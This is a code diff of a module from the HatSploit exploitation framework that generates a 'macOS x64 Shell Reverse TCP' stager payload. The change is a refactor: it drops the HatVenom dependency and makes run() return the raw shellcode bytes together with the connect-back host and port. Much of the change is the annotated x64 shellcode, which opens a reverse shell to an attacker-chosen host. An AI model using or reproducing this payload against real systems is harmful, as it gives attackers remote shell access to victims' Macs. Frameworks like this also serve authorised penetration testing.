@@ -5,12 +5,11 @@
 # Current source: https://github.com/EntySec/HatSploit
 #
 
-from hatvenom import HatVenom
 from hatsploit.lib.payload import Payload
 from hatsploit.utils.tcp import TCPClient
 
 
-class HatSploitPayload(Payload, HatVenom):
+class HatSploitPayload(Payload):
     details = {
         'Category': "stager",
         'Name': "macOS x64 Shell Reverse TCP",
@@ -46,12 +45,7 @@ class HatSploitPayload(Payload, HatVenom):
     def run(self):
         connback_host, connback_port = self.parse_options(self.options)
 
-        offsets = {
-            'cbhost': connback_host,
-            'cbport': connback_port
-        }
-
-        shellcode = (
+        return (
             b"\x41\xb0\x02"      # movb  $2, %r8b
             b"\x49\xc1\xe0\x18"  # shlq  $24, %r8
             b"\x49\x83\xc8\x61"  # orq  $97, %r8
@@ -93,7 +87,7 @@ class HatSploitPayload(Payload, HatVenom):
             b"\x48\x89\xe7"      # movq	 %rsp, %rdi
             b"\x48\x31\xf6"      # xorq	 %rsi, %rsi
             b"\x0f\x05"          # syscall
-        )
-
-        payload = self.generate('macho', 'x64', shellcode, offsets)
-        return payload
+        ), {
+            'cbhost': connback_host,
+            'cbport': connback_port
+        }
